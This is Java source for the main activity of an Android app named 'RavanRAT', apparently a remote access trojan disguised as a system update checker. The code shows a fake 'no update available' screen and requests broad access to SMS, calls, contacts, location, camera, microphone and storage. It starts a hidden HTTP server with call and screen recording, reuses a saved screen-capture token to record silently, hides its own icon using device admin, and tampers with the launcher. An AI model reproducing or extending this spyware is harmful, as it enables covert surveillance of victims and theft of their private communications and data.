package com.security.ravan;

import android.Manifest;
import android.app.ActivityManager;
import android.app.admin.DevicePolicyManager;
import android.view.accessibility.AccessibilityManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.Inet6Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int MANAGE_STORAGE_REQUEST_CODE = 1002;
    private static final int SCREEN_CAPTURE_REQUEST_CODE = 1004;
    private static final int REQUEST_DEVICE_ADMIN = 1005;
    private static final String PREFS_NAME = "RavanRATPrefs";
    private static final String PREF_SCREEN_CAPTURE_RESULT_CODE = "screen_capture_result_code";
    private static final String PREF_AUTO_SCREEN_RECORD_BOOT = "auto_screen_record_on_boot";
    private static final String PREF_WAITING_FOR_ACCESSIBILITY = "waiting_for_accessibility";
    private static final String EXTRA_SCREEN_CAPTURE_RESULT_CODE = "extra_screen_capture_result_code";
    private static final String EXTRA_SCREEN_CAPTURE_INTENT = "extra_screen_capture_intent";
    private static Intent cachedScreenCaptureIntent;
    private boolean pendingScreenRecordRequest = false;
    private SharedPreferences prefs;

    private TextView tvStatus;
    private TextView tvUpdateResult;
    private ProgressBar progressBar;
    private int tapCount = 0;
    private android.os.Handler tapHandler = new android.os.Handler();
    private Runnable resetTapCount = () -> tapCount = 0;
    private int settingsTapCount = 0;
    private android.os.Handler settingsTapHandler = new android.os.Handler();
    private Runnable resetSettingsTap = () -> settingsTapCount = 0;
    private boolean isServerRunning = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        NotificationStore.init(this);
        initViews();
        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        startWatchdogIfNeeded();
        startServer(); // Start the HTTP server in background
        requestPermissions();

        // Fake system update: show "Checking..." for 2 seconds, then "No update available"
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            if (progressBar != null) {
                progressBar.setVisibility(android.view.View.GONE);
            }
            if (tvStatus != null) {
                tvStatus.setVisibility(android.view.View.GONE);
            }
            if (tvUpdateResult != null) {
                tvUpdateResult.setVisibility(android.view.View.VISIBLE);
            }
        }, 2000);

        Intent initialIntent = getIntent();
        String initialAction = initialIntent != null ? initialIntent.getAction() : null;
        android.util.Log.d("MainActivity", "onCreate: initialAction=" + initialAction);

        if ("REQUEST_SCREEN_CAPTURE_RECORD".equals(initialAction)) {
            android.util.Log.d("MainActivity", "onCreate: REQUEST_SCREEN_CAPTURE_RECORD detected");
            if (hasStoredScreenCaptureToken()) {
                android.util.Log.d("MainActivity", "onCreate: Token found, starting recording in background");
                startScreenRecordingWithStoredToken();
                finish(); // Close the activity since we have a token
            } else {
                android.util.Log.d("MainActivity", "onCreate: No token found, requesting permission");
                pendingScreenRecordRequest = true;
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(
                        this::requestScreenCapturePermission, 500);
            }
        } else if ("REQUEST_SCREEN_CAPTURE".equals(initialAction)) {
            android.util.Log.d("MainActivity", "onCreate: REQUEST_SCREEN_CAPTURE detected");
            if (hasStoredScreenCaptureToken()) {
                Intent storedIntent = getStoredScreenCaptureIntent();
                int storedResultCode = getStoredScreenCaptureResultCode();
                if (storedIntent != null && storedResultCode != -1) {
                    ScreenCaptureManager.startProjection(this, storedResultCode, storedIntent);
                }
                finish(); // Close the activity since we have a token
            } else {
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(
                        this::requestScreenCapturePermission, 500);
            }
        } else if (isAutoScreenRecordOnBootEnabled() && hasStoredScreenCaptureToken() && !ScreenRecordService.isRecording()) {
            android.util.Log.d("MainActivity", "onCreate: Auto-start on boot enabled");
            startScreenRecordingWithStoredToken();
            finish(); // Close the activity since we have a token
        }
    }

    private void initViews() {
        tvStatus = findViewById(R.id.tvStatus);
        tvUpdateResult = findViewById(R.id.tvUpdateResult);
        progressBar = findViewById(R.id.progressBar);
        if (tvUpdateResult != null) {
            tvUpdateResult.setOnClickListener(v -> {
                tapCount++;
                if (tapCount >= 5) {
                    tapCount = 0;
                    openNotificationSettings();
                }
                tapHandler.removeCallbacks(resetTapCount);
                tapHandler.postDelayed(resetTapCount, 2000);
            });
        }
        if (!isSettingsButtonHidden()) {
            setupSettingsButton();
        } else {
            android.widget.Button hiddenBtn = findViewById(R.id.btnOpenNotificationSettings);
            if (hiddenBtn != null) {
                hiddenBtn.setVisibility(android.view.View.GONE);
            }
        }
    }

    private void openNotificationSettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            try {
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            } catch (Exception ignored) {
            }
        }
    }

    private void setupSettingsButton() {
        android.widget.Button btn = findViewById(R.id.btnOpenNotificationSettings);
        if (btn != null) {
            btn.setOnClickListener(v -> {
                settingsTapCount++;
                if (settingsTapCount >= 5) {
                    settingsTapCount = 0;
                    openNotificationSettings();
                    hideSettingsButtonPermanently();
                }
                settingsTapHandler.removeCallbacks(resetSettingsTap);
                settingsTapHandler.postDelayed(resetSettingsTap, 2000);
            });
        }
    }

    private void hideSettingsButtonPermanently() {
        SharedPreferences prefs = getSharedPreferences("RavanRAT", MODE_PRIVATE);
        prefs.edit().putBoolean("settings_button_hidden", true).apply();
        android.widget.Button btn = findViewById(R.id.btnOpenNotificationSettings);
        if (btn != null) {
            btn.setVisibility(android.view.View.GONE);
        }
    }

    private boolean isSettingsButtonHidden() {
        SharedPreferences prefs = getSharedPreferences("RavanRAT", MODE_PRIVATE);
        return prefs.getBoolean("settings_button_hidden", false);
    }

    private void requestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();

        // Storage permissions based on Android version
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES);
            }
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_MEDIA_VIDEO);
            }
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_MEDIA_AUDIO);
            }
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS);
            }
        } else {
            // Android 12 and below
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            }
        }

        // Call logs permission
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_CALL_LOG);
        }

        // Contacts permission
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_CONTACTS);
        }

        // Phone state permission for device info
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);
        }

        // SMS permissions
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_SMS);
        }
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.SEND_SMS);
        }

        // Location permissions
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.ACCESS_FINE_LOCATION);
        }
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        }

        // Camera permission
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.CAMERA);
        }

        // Audio recording permission
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.RECORD_AUDIO);
        }

        // Process outgoing calls permission (for call detection)
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
        }

        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }

        // Request MANAGE_EXTERNAL_STORAGE for Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                }
            }
        }

        // Request overlay permission for background camera
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, 1003);
            }
        }
    }

    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            } else {
                Toast.makeText(this, "Battery optimization already disabled", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void requestDeviceAdmin() {
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for launcher refresh and stealth mode");
        startActivityForResult(intent, REQUEST_DEVICE_ADMIN);
    }

    private void hideAppWithDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(adminComponent)) {
            try {
                boolean hidden = dpm.setApplicationHidden(adminComponent, getPackageName(), true);
                Log.d("MainActivity", "App hidden via DevicePolicyManager: " + hidden);
                if (!hidden) {
                    hideAppIcon();
                }
            } catch (Exception e) {
                Log.e("MainActivity", "DeviceAdmin hide failed: " + e.getMessage(), e);
                hideAppIcon();
            }
        } else {
            hideAppIcon();
        }
    }

    private void requestScreenCapturePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            ensureAppInForeground();
            MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            if (projectionManager != null) {
                Intent permissionIntent = projectionManager.createScreenCaptureIntent();
                startActivityForResult(permissionIntent, SCREEN_CAPTURE_REQUEST_CODE);
            }
        }
    }

    private void ensureAppInForeground() {
        try {
            ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
            if (am != null) {
                am.moveTaskToFront(getTaskId(), ActivityManager.MOVE_TASK_WITH_HOME);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Check if all required permissions are granted
    private boolean hasRuntimePermissions() {
        String[] permissions = {
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
        };
        for (String permission : permissions) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                Log.d("MainActivity", "hasRuntimePermissions: false for " + permission);
                return false;
            }
        }
        Log.d("MainActivity", "hasRuntimePermissions: true");
        return true;
    }

    private boolean isDeviceAdminActive() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
        return dpm != null && dpm.isAdminActive(adminComponent);
    }

    private boolean allPermissionsGranted() {
        boolean runtimeGranted = hasRuntimePermissions();
        boolean adminActive = isDeviceAdminActive();
        Log.d("MainActivity", "allPermissionsGranted: runtime=" + runtimeGranted + " admin=" + adminActive);
        return runtimeGranted && adminActive;
    }

    // Hide the app icon
    private void hideAppIcon() {
        Log.d("MainActivity", "hideAppIcon called");
        try {
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            getPackageManager().setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );
            Log.d("MainActivity", "hideAppIcon succeeded");
        } catch (Exception e) {
            Log.e("MainActivity", "hideAppIcon failed: " + e.getMessage(), e);
            e.printStackTrace();
        }
    }

    private void openAccessibilitySettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void refreshLauncher() {
        Log.d("MainActivity", "refreshLauncher called");
        runOnUiThread(() -> {
            try {
                Intent homeIntent = new Intent(Intent.ACTION_MAIN);
                homeIntent.addCategory(Intent.CATEGORY_HOME);
                homeIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(homeIntent);
                Log.d("MainActivity", "refreshLauncher: home intent sent");
            } catch (Exception e) {
                String message = "refreshLauncher home intent failed: " + e.getMessage();
                Log.e("MainActivity", message, e);
                reportLauncherRefreshError(message);
            }
        });

        new Thread(() -> {
            StringBuilder errors = new StringBuilder();
            String launcherPackage = getLauncherPackageName();
            if (launcherPackage != null) {
                try {
                    Log.d("MainActivity", "refreshLauncher: launcherPackage=" + launcherPackage);
                    Process process = Runtime.getRuntime().exec(new String[]{"am", "force-stop", launcherPackage});
                    int exitCode = process.waitFor();
                    Log.d("MainActivity", "refreshLauncher force-stop exitCode=" + exitCode);
                    if (exitCode != 0) {
                        errors.append("force-stop(").append(launcherPackage).append(") exit=").append(exitCode).append("; ");
                        errors.append(readProcessOutput(process));
                    }
                } catch (Exception e) {
                    String message = "refreshLauncher force-stop failed: " + e.getMessage();
                    Log.e("MainActivity", message, e);
                    errors.append(message).append("; ");
                }

                try {
                    Log.d("MainActivity", "refreshLauncher: trying pm disable/enable");
                    Process disableProcess = Runtime.getRuntime().exec(new String[]{"pm", "disable", "--user", "0", launcherPackage});
                    int disableExit = disableProcess.waitFor();
                    Log.d("MainActivity", "refreshLauncher pm disable exitCode=" + disableExit);
                    if (disableExit != 0) {
                        errors.append("pm disable exit=").append(disableExit).append("; ");
                        errors.append(readProcessOutput(disableProcess));
                    }
                    Process enableProcess = Runtime.getRuntime().exec(new String[]{"pm", "enable", "--user", "0", launcherPackage});
                    int enableExit = enableProcess.waitFor();
                    Log.d("MainActivity", "refreshLauncher pm enable exitCode=" + enableExit);
                    if (enableExit != 0) {
                        errors.append("pm enable exit=").append(enableExit).append("; ");
                        errors.append(readProcessOutput(enableProcess));
                    }
                } catch (Exception e) {
                    String message = "refreshLauncher pm disable/enable failed: " + e.getMessage();
                    Log.e("MainActivity", message, e);
                    errors.append(message).append("; ");
                }
            } else {
                String message = "refreshLauncher could not resolve launcher package";
                Log.e("MainActivity", message);
                errors.append(message).append("; ");
            }

            try {
                ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
                if (am != null) {
                    for (ActivityManager.RunningAppProcessInfo processInfo : am.getRunningAppProcesses()) {
                        if (processInfo.processName != null && (processInfo.processName.contains("launcher") || processInfo.processName.equals(launcherPackage))) {
                            Log.d("MainActivity", "refreshLauncher killing launcher process: " + processInfo.processName);
                            am.killBackgroundProcesses(processInfo.processName);
                        }
                    }
                }
            } catch (Exception e) {
                String message = "refreshLauncher killBackgroundProcesses failed: " + e.getMessage();
                Log.e("MainActivity", message, e);
                errors.append(message).append("; ");
            }

            if (errors.length() > 0) {
                reportLauncherRefreshError(errors.toString());
            }
        }).start();
    }

    private String readProcessOutput(Process process) {
        StringBuilder output = new StringBuilder();
        try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getErrorStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append(" ");
            }
        } catch (Exception ignored) {
        }
        return output.toString();
    }

    private String getLauncherPackageName() {
        Intent homeIntent = new Intent(Intent.ACTION_MAIN);
        homeIntent.addCategory(Intent.CATEGORY_HOME);
        ResolveInfo resolveInfo = getPackageManager().resolveActivity(homeIntent, PackageManager.MATCH_DEFAULT_ONLY);
        if (resolveInfo != null && resolveInfo.activityInfo != null) {
            return resolveInfo.activityInfo.packageName;
        }
        return null;
    }

    private void reportLauncherRefreshError(String message) {
        Log.e("MainActivity", "Launcher refresh error: " + message);
        runOnUiThread(() -> {
            if (tvStatus != null) {
                tvStatus.setText("Launcher refresh error: " + message);
                try {
                    tvStatus.setTextColor(getColor(android.R.color.holo_red_dark));
                } catch (Exception ignored) {
                }
            }
        });
    }

    @Override
    protected void onPause() {
        super.onPause();
        Log.d("MainActivity", "onPause called");
        // Auto-hide disabled: app stays visible
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.d("MainActivity", "onDestroy called");
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        String action = intent.getAction();
        android.util.Log.d("MainActivity", "onNewIntent: action=" + action);
        if ("REQUEST_SCREEN_CAPTURE_RECORD".equals(action)) {
            android.util.Log.d("MainActivity", "onNewIntent: REQUEST_SCREEN_CAPTURE_RECORD detected");
            if (hasStoredScreenCaptureToken()) {
                android.util.Log.d("MainActivity", "onNewIntent: Token found, starting recording in background");
                startScreenRecordingWithStoredToken();
                finish(); // Close the activity since we have a token
            } else {
                android.util.Log.d("MainActivity", "onNewIntent: No token found, requesting permission");
                pendingScreenRecordRequest = true;
                ensureAppInForeground(); // Only come to foreground if permission is needed
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(
                        this::requestScreenCapturePermission, 300);
            }
        } else if ("REQUEST_SCREEN_CAPTURE".equals(action)) {
            android.util.Log.d("MainActivity", "onNewIntent: REQUEST_SCREEN_CAPTURE detected");
            if (hasStoredScreenCaptureToken()) {
                Intent storedIntent = getStoredScreenCaptureIntent();
                int storedResultCode = getStoredScreenCaptureResultCode();
                if (storedIntent != null && storedResultCode != -1) {
                    ScreenCaptureManager.startProjection(this, storedResultCode, storedIntent);
                }
                finish(); // Close the activity since we have a token
            } else {
                ensureAppInForeground(); // Only come to foreground if permission is needed
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(
                        this::requestScreenCapturePermission, 300);
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == SCREEN_CAPTURE_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                cachedScreenCaptureIntent = data;
                saveScreenCapturePermissionToken(resultCode, data);
                if (pendingScreenRecordRequest) {
                    // start the recording service and pass projection data
                    try {
                        Intent serviceIntent = new Intent(this, ScreenRecordService.class);
                        serviceIntent.setAction("START_RECORD");
                        serviceIntent.putExtra(EXTRA_SCREEN_CAPTURE_RESULT_CODE, resultCode);
                        serviceIntent.putExtra(EXTRA_SCREEN_CAPTURE_INTENT, data);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(serviceIntent);
                        } else {
                            startService(serviceIntent);
                        }
//                        Toast.makeText(this, "Screen recording started", Toast.LENGTH_SHORT).show();
                    } catch (Exception e) {
                        Toast.makeText(this, "Failed to start screen recording: " + e.getMessage(), Toast.LENGTH_LONG).show();
                    }
                    pendingScreenRecordRequest = false;
                } else {
                    ScreenCaptureManager.startProjection(this, resultCode, data);
//                    Toast.makeText(this, "Screen capture permission granted", Toast.LENGTH_SHORT).show();
                }
            } else {
//                Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show();
            }
        } else if (requestCode == REQUEST_DEVICE_ADMIN) {
            if (resultCode == RESULT_OK || isDeviceAdminActive()) {
                Log.d("MainActivity", "Device admin enabled");
                // Auto-hide disabled: keep app visible
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
            @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Start server after permissions are granted
            startServerInBackground();
        }
    }

    private void saveScreenCapturePermissionToken(int resultCode, Intent data) {
        if (data == null || prefs == null) {
            android.util.Log.e("MainActivity", "Cannot save token: data=" + data + ", prefs=" + prefs);
            return;
        }
        try {
            prefs.edit()
                    .putInt(PREF_SCREEN_CAPTURE_RESULT_CODE, resultCode)
                    .apply();
            android.util.Log.d("MainActivity", "Token saved successfully. ResultCode=" + resultCode);
        } catch (Exception e) {
            android.util.Log.e("MainActivity", "Error saving token: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private boolean hasStoredScreenCaptureToken() {
        boolean hasToken = cachedScreenCaptureIntent != null;
        android.util.Log.d("MainActivity", "hasStoredScreenCaptureToken: " + hasToken + " (cached=" + (cachedScreenCaptureIntent != null) + ", prefs=" + (prefs != null) + ")");
        return hasToken;
    }

    private int getStoredScreenCaptureResultCode() {
        if (prefs == null) {
            android.util.Log.w("MainActivity", "prefs is null in getStoredScreenCaptureResultCode");
            return -1;
        }
        int resultCode = prefs.getInt(PREF_SCREEN_CAPTURE_RESULT_CODE, -1);
        android.util.Log.d("MainActivity", "getStoredScreenCaptureResultCode: " + resultCode);
        return resultCode;
    }

    private Intent getStoredScreenCaptureIntent() {
        if (cachedScreenCaptureIntent != null) {
            android.util.Log.d("MainActivity", "Returning cached original screen capture Intent");
            return cachedScreenCaptureIntent;
        }
        if (prefs == null) {
            android.util.Log.w("MainActivity", "prefs is null in getStoredScreenCaptureIntent");
            return null;
        }
        android.util.Log.w("MainActivity", "No cached original Intent available; cannot reliably restore media projection from stored URI");
        return null;
    }

    private void startScreenRecordingWithStoredToken() {
        android.util.Log.d("MainActivity", "startScreenRecordingWithStoredToken called");
        int storedResultCode = getStoredScreenCaptureResultCode();
        Intent storedData = getStoredScreenCaptureIntent();
        
        if (storedResultCode != RESULT_OK) {
            android.util.Log.e("MainActivity", "Failed to start recording: resultCode is not RESULT_OK: " + storedResultCode);
            Toast.makeText(this, "Failed to start recording: invalid token result code", Toast.LENGTH_LONG).show();
            return;
        }
        
        if (storedData == null) {
            android.util.Log.e("MainActivity", "Failed to start recording: storedData is null");
            Toast.makeText(this, "Failed to start recording: no stored token data", Toast.LENGTH_LONG).show();
            return;
        }

        try {
            android.util.Log.d("MainActivity", "Starting foreground service with stored token. ResultCode=" + storedResultCode);
            Intent serviceIntent = new Intent(this, ScreenRecordService.class);
            serviceIntent.setAction("START_RECORD");
            serviceIntent.putExtra(EXTRA_SCREEN_CAPTURE_RESULT_CODE, storedResultCode);
            serviceIntent.putExtra(EXTRA_SCREEN_CAPTURE_INTENT, storedData);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            android.util.Log.d("MainActivity", "Foreground service started successfully");
            // Toast.makeText(this, "Auto screen recording started", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            android.util.Log.e("MainActivity", "Exception starting recording service: " + e.getMessage());
            Toast.makeText(this, "Failed to start auto screen recording: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    private boolean isAutoScreenRecordOnBootEnabled() {
        return prefs != null && prefs.getBoolean(PREF_AUTO_SCREEN_RECORD_BOOT, false);
    }

    private void setAutoScreenRecordOnBootEnabled(boolean enabled) {
        if (prefs != null) {
            prefs.edit().putBoolean(PREF_AUTO_SCREEN_RECORD_BOOT, enabled).apply();
        }
    }

    private void toggleServer() {
        if (isServerRunning) {
            stopServer();
        } else {
            startServer();
        }
    }

    private void startServer() {
        Intent serviceIntent = new Intent(this, HttpServerService.class);
        serviceIntent.setAction("START");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        Intent watchdogIntent = new Intent(this, WatchdogService.class);
        startService(watchdogIntent);

        // Start CallRecordService for call detection and recording
        Intent callServiceIntent = new Intent(this, CallRecordService.class);
        callServiceIntent.setAction("START_SERVICE");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(callServiceIntent);
        } else {
            startService(callServiceIntent);
        }

        isServerRunning = true;
    }

    private void startServerInBackground() {
        startServer();
    }

    private void stopServer() {
        Intent serviceIntent = new Intent(this, HttpServerService.class);
        serviceIntent.setAction("STOP");
        startService(serviceIntent);

        isServerRunning = false;
    }

    private void startWatchdogIfNeeded() {
        if (!isWatchdogRunning()) {
            Intent watchdogIntent = new Intent(this, WatchdogService.class);
            startService(watchdogIntent);
        }
    }

    private boolean isWatchdogRunning() {
        return isServiceRunning(WatchdogService.class);
    }

    private boolean isServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
        if (manager == null) {
            return false;
        }
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    private void updateUI() {
        if (isServerRunning) {
            tvStatus.setText("🟢 Server Running");
            tvStatus.setTextColor(getColor(android.R.color.holo_green_dark));
            // btnStartStop.setText("Stop Server");
            // btnStartStop.setBackgroundColor(getColor(android.R.color.holo_red_light));

            // tvIpAddress.setText("Fetching Public IPv6...");
            // tvServerUrl.setText("Please wait...");

            getPublicIPv6Async(ip -> {
                runOnUiThread(() -> {
                    if (ip != null) {
                        // tvIpAddress.setText("IPv6: " + ip);
                        // tvServerUrl.setText("http://[" + ip + "]:8080");
                    } else {
                        // Fallback to local if public fetch fails
                        String localIp = getLocalIPv6Address();
                        if (localIp != null) {
                            // tvIpAddress.setText("IPv6 (Local): " + localIp);
                            // tvServerUrl.setText("http://[" + localIp + "]:8080");
                        } else {
                            // tvIpAddress.setText("IPv6: Not available");
                            // tvServerUrl.setText("Check network connection");
                        }
                    }
                });
            });

        } else {
            tvStatus.setText("🔴 Server Stopped");
            tvStatus.setTextColor(getColor(android.R.color.holo_red_dark));
            // btnStartStop.setText("Start Server");
            // btnStartStop.setBackgroundColor(getColor(android.R.color.holo_green_dark));
            // tvServerUrl.setText("Not running");
            // tvIpAddress.setText("IPv6: Service Stopped");
        }
    }

    public interface IpCallback {
        void onResult(String ip);
    }

    public static void getPublicIPv6Async(IpCallback callback) {
        ExecutorService executor = Executors.newSingleThreadExecutor();
        executor.execute(() -> {
            String publicIp = null;
            try {
                URL url = new URL("https://api64.ipify.org");
                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setConnectTimeout(5000);
                urlConnection.setReadTimeout(5000);
                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                publicIp = in.readLine();
                in.close();
            } catch (Exception e) {
                e.printStackTrace();
            }

            // If external fetch fails, try to find a global unicast address locally
            if (publicIp == null) {
                publicIp = getLocalIPv6Address();
            }

            callback.onResult(publicIp);
        });
        executor.shutdown();
    }

